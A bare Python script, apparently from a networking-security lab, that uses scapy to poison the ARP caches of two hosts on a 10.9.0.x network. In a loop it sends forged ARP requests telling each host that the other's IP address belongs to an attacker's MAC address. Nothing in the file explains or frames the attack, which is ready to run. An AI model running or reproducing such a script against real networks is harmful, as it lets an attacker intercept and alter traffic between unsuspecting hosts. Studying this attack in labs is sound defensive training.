#!/usr/bin/env python3
from scapy.all import *
import time

targetIp = '10.9.0.5'
ipB = '10.9.0.6'
macM = '02:42:0a:09:00:69'

E = Ether()
A = ARP()

def sendArpRequestToA():
    E.dst = 'ff:ff:ff:ff:ff:ff'
    A.hwsrc = macM
    A.psrc = ipB
    A.pdst = targetIp
    A.op = 1  # 1 for ARP request; 2 for ARP reply
    pkt = E / A
    sendp(pkt)

def sendArpRequestToB():
    E.dst = 'ff:ff:ff:ff:ff:ff'
    A.hwsrc = macM
    A.psrc = targetIp
    A.pdst = ipB
    A.op = 1  # 1 for ARP request; 2 for ARP reply
    pkt = E / A
    sendp(pkt)

while True:
    sendArpRequestToA()
    sendArpRequestToB()
    time.sleep(5)
